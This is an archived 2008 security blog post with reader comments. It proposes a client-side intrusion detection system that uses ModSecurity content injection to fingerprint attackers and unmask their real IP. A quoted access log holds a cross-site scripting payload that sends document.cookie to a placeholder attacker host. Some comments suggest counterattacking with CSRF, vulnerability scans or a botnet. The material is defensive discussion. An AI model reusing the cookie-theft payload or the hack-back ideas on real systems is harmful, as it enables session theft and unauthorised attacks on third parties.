<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
	
<!-- Mirrored from www.gnucitizen.org/blog/content-injection-hack-the-hacker/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:49:25 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
		<title>GNUCITIZEN &raquo; Content Injection: Hack the Hacker</title>
			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Content Injection: Hack the Hacker Comments Feed" href="feed/index.html" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Hidden' href='../hidden/index.html' />
<link rel='next' title='Default key algorithm in Thomson and BT Home Hub routers' href='../default-key-algorithm-in-thomson-and-bt-home-hub-routers/index.html' />
<meta name="generator" content="WordPress 3.3.2" />
<link rel='canonical' href='index.html' />
<link rel='shortlink' href='../../indexf53a.html?p=809' />
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
	
	<body id="single" class="blog">
		<div id="header">
			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
			<p><span>Information Security Think Tank</span></p>
		</div>

<div id="navigation">
	<h2>Navigation</h2>
	<ul>
		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
			</ul>
</div>

<div id="content">
			<div id="entry">
							<div id="post-809" class="post">
	<div class="post-title"><h2><span>Content Injection: Hack the Hacker</span></h2></div>
	<div class="post-date"><span>published:</span> April 11th, 2008</div>
	<div class="post-content"><div class="single-content-top-widgets"></div><p>Traditional IDS/IPS systems occur at the network level, usually plugged into a spanning port on a switch. I love this concept and think it should be part of any defense in depth strategy. The two primary weaknesses in these devices are, (1) they cannot process encrypted streams and (2) they can often be circumvented with a little creativity. In this post I want to discuss using Client-Side IDS (C-IDS) for more advanced attack detection.</p>

<p>I don&#8217;t know how realistic this would be but it could be fun concept to investigate. Imagine setting up modules on your reverse proxy. As user visits the site, different modules could get launched during different requests. One module could detect a user&#8217;s browser plugins. One module could detect Tor and other services with Tor. Put the results into a hashing algorithm and you have a semi-unique client fingerprint regardless of IP address (although privacy laws could restrict these kinds of requests). OR, our reverse proxy could inject random code snippets of defense, overwriting and hijacking JavaScript functions (i.e. alert) with our own action (i.e. logging, blocking etc). Check out some of Mario&#8217;s code snippets of defense for the idea: <a href="../snippets-of-defense-pti/index.html">here</a>, <a href="../snippets-of-defense-ptii/index.html">here</a>, <a href="../snippets-of-defense-ptiii/index.html">here</a>, and <a href="../snippets-of-defense-ptiv/index.html">here</a></p>

<p>So what benefits would a client-side IDS (C-IDS) provide?</p>

<ul>
<li>Client side code is interoperable. This means it can be rapidly deployed across any number of networks;</li>
<li>Client side code works over encrypted sessions. We don&#8217;t need to worry about SSL termination issues and reading into encrypted sessions;</li>
<li>Client side code allows us to hook into the user&#8217;s browser where the attacks are happening. This gives us greater control and the possibility to detect advanced anti-filter attacks (obfuscation &amp; polymorphism.);</li>
<li>Client side code allows us to attack the attacker. We could execute code to determine if the attacker is using Tor or any number of browser-related variables.</li>
</ul>

<p>Basically, the same engine discussed for Web 2.0 worms could theoritically be used as an additional <strong>defense in depth</strong> tool. The latest version of <a href="http://modsecurity.org/projects/modsecurity/apache/feature_content_injection.html">ModSecurity (2.5)</a> allows two new rules, <code>&quot;prepend&quot;</code> or <code>&quot;append&quot;</code>. These rules allow us to insert HTML/text into our HTTP responses. This type of flexability opens an entire range of doors. Great stuff guys! Here&#8217;s an example from ModSecurity Content Injection article:</p>

<blockquote><p>The following rule uses the same data as the previous example, except this time, instead of simply sending an alert pop-up box we are sending the <code>MyAddress.class</code> java applet. This code will force the attacker&#8217;s browser to initiate a connection back to our web server.</p>

<pre><code>SecRule TX:ALERT "@eq 1" "phase:3,nolog,pass,chain,prepend:''"
SecRule RESPONSE_CONTENT_TYPE "^text/html"</code></pre>

<p>So, if an attacker sends a malicious request that ModSecurity triggers on, this rule will then fire and it will send the injected code to the client. Our Apache access_logs will show data similar to this:</p>

<pre><code>203.160.1.47 - - [20/Jan/2008:21:15:03 -0500] "GET /cgi-bin/foo.cgi?param=%3Cscript%3Edocument.write('%3Cimg%20src=%22http://hackersite/'+document.cookie+'%22')%3C/script%3E HTTP/1.1" 500 676
203.160.1.47 - - [20/Jan/2008:21:15:03 -0500] "GET /cgi-bin/grab_ip.php?IP=222.141.50.175 HTTP/1.1" 404 207</code></pre>

<p>As you can see, even though the IP address in the access_logs shows <code>203.160.1.47</code>, the data returned in the <code>QUERY_STRING</code> portion of the second line shows that the real IP address of the attacker is <code>222.141.50.175</code>. This would mean that in this case, the attacker&#8217;s system was not on a private network (perhaps just connecting their computer directly to the internet). <code>Attacker's computer -&gt; Proxy -&gt; Proxy -&gt; etc... -&gt; Target Website</code>.</p></blockquote><div class="single-content-bottom-widgets"></div></div>
		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/dkza/index.html" title="Posts by dkza" rel="author">dkza</a></div>
	<div class="post-tags">Tags: <a href="../../tags/ids/index.html" rel="tag">IDS</a> | <a href="../../tags/intruder-detection/index.html" rel="tag">Intruder Detection</a> | <a href="../../tags/intruder-prevention/index.html" rel="tag">Intruder Prevention</a> | <a href="../../tags/ips/index.html" rel="tag">IPS</a> | <a href="../../tags/web-20/index.html" rel="tag">Web 2.0</a></div></div>
				

				<div id="post-comments">
					<div class="comment even thread-even depth-1" id="comment-118674">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/1f74196b2e9b231e7ba9a49d2b61ec2c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://danielcuthbert.com/' rel='external nofollow' class='url'>Dnaiel</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118674">
			April 12, 2008 at 10:00 am</a>		</div>

		<p>I actually use this at the moment, I won&#8217;t say what I do when some useless c*nt tries to hack the box, but it&#8217;s pretty effective to say the least.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-118685">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/bd53983161441595a6c36a6ba42998c4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">xnull</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118685">
			April 12, 2008 at 7:06 pm</a>		</div>

		<p>David, that is fun to think about, but most attacker&#8217;s browsers (at least ones used in a serious attack) are stripped down of Java, javascript, flash and many other functionalities (many times even cookies). Torbutton is an example of an add-on for Firefox which tries to do this for an attacker automatically.</p>
<p>A lot of blackhats bother compiling a separate browser to be their Tor browser.</p>
<p>Keep in mind that anything client-side is in complete control of the attacker and can also be defeated with just a little bit of creativity.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-118743">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/43f66dac129f41f5641c5e014809e3d5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://vapt-sec.com/' rel='external nofollow' class='url'>Yousif Yalda</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118743">
			April 13, 2008 at 7:02 pm</a>		</div>

		<p>Nice post, I agree with these methods. Now this is actual out-of-the-box thinking. Trapping the hacker scheme is always what I have in mind when implementing any type of IDS, specifically reducing the use of heavy technologies, and rather just applying what we already have customized in crafted requests in real-time. I&#8217;ll too be discussing ways of IDS concepts on my blog soon, I&#8217;m working on a POC to release soon as well, good job man!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-dkza bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-118789">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/1d95d2324345e3dd2e41d6066cc1b492?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://withdk.com/' rel='external nofollow' class='url'>David Kierznowski</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118789">
			April 14, 2008 at 11:30 am</a>		</div>

		<p>Daniel, watch out for false positives :)</p>
<p>xnull, I haven&#8217;t actually heard of people doing this, although I have heard of peeps using a virtualised browser (i.e. VMWare etc).</p>
<p>Yousif, thanks man, keep us posted on your blog progress, would be interesting to see what you come up with.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-118795">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5e0f595cbc8f1811233adce10ac6c5d3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.awesomeandrew.net/' rel='external nofollow' class='url'>Awesome AnDrEw</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118795">
			April 14, 2008 at 2:54 pm</a>		</div>

		<p>Out of the hundreds or thousands of attacks I receive daily a large number of them are through wget, Perl, Java, and similar applications which have been automated. Very few are from legitimate clients, but I do find a lot of attempts from Firefox users&#8217; who then try to spoof their User-Agent. A great way to tell the difference between bots and humans who are using real browsers is that in most cases even if Java, Javascript, and other embedded entities are disabled there will be a significant number of requests for other resources such as images or stylesheets (though this also depends on both the type and amount of content on a page). Most automated attacks only target a specific page, and do not make subsequent requests for the material placed on the page.</p>
<p>I&#8217;ve set up my own layered system for custom intrustion detection, but some of the more interesting concepts along the lines of what you&#8217;ve talked about, which I have come up with, include using CSRF or 302 redirections to pass off the traffic to another host (I believe the owner of Blue Hat SEO did this when his website was being attacked, and redirected all of the malicious traffic to the FBI&#8217;s website), bombarding the user with advertisements (this would only apply to those illegitimate requests caused by individuals), scanning the client for vulnerabilities, or attacking the client with one&#8217;s own botnet. The CSRF issue is probably the most entertaining due to all of the possibilities it entails.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-118826">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/cd39672ed1d60132b740e0b199cd5ee5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">mordox</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118826">
			April 15, 2008 at 11:46 am</a>		</div>

		<p>Bharosa / Oracle OAAM too uses a client fingerprinting technology to identify threats</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-118985">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/24a1e9cbc9ea78adc0445aa1adc545bf?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://hkashfi.blogspot.com/' rel='external nofollow' class='url'>Hamid.K</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118985">
			April 18, 2008 at 8:56 pm</a>		</div>

		<p>While looking like a nice (but not new) idea , I believe it completely failed  , for various reasons :</p>
<p>1- The same reason/capability make serious hackers bypass your IDS/IPS  , makes them bypass this one.<br />
2-As xnull already mentioned , every mechanism used for security(defense or defeat) at client-side should be considered broken . No matter how complex or obfuscated it is , it`s broken .<br />
3-Now days , even beginners has learned to live without JS in their browsers . So maybe another solution should be applied ?<br />
4- Wise people doing web-app testing (or hacking)check web-servers responses as much as they do for requests ! So such a behavior could be catchd almost immediately by them.<br />
5- If the hacker is still getting back-traced after these all , for sure s/he must be a script-kiddie not capable of doing anything serious . so just making more noise in logs . The goal should be reducing them as much as possible , to be able to use them effectively . right ?<br />
6- Even if #5 didn`t matched your business and you think with #5 your web-app/server could still get hurted , then this solution or trick is not for you ! Best advice for such system IMO is to completely shut it down , and sleep well at nights :)</p>
<p>finally , I love your blog , and am learning new ideas each time I visit it . keep the great job guys .</p>

		<div class="reply">
				</div>
		</div>
		</div>
		
		<div class="post-comments-navigation">
			<div class="older-comments"></div>
			<div class="newer-comments"></div>
		</div>
	
	<div id="post-response">
		<h2>Respond</h2>
					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
									<div><label for="author">name: (required)</label></div>
					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
					<div><label for="email">mail: (required)</label></div>
					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
					<div><label for="url">website:</label></div>
					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
								<div><label for="comment">comment:</label></div>
				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
				<div>
					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
				</div>
				<input type="hidden" name="comment_post_ID" value="809"/>
				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="5b7cf81b2d" /></p>

	<p style="clear: both;" class="subscribe-to-comments">
	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
	<label for="subscribe">Notify me of followup comments via e-mail</label>
	</p>


			</form>
			</div>
					</div>
		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>

				
		<div id="footer">
			
	<script type="text/javascript">
		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
	</script>
	<script type="text/javascript">
		var pageTracker = _gat._getTracker('UA-363996-1');
		pageTracker._initData();
		pageTracker._trackPageview();
	</script>

				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
		</div>
		
		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
			<Work rdf:about="">
				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
				<dc:title>GNUCITIZEN</dc:title>
				<dc:date>2005-2012</dc:date>
				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
				<dc:source rdf:resource="http://www.gnucitizen.org"/>
			</Work>
			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
			</License>
		</rdf:RDF> -->
		
		<!-- tested by blogsecurify -->
		<!-- wpscanner -->
	</body>

<!-- Mirrored from www.gnucitizen.org/blog/content-injection-hack-the-hacker/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:49:25 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
</html>
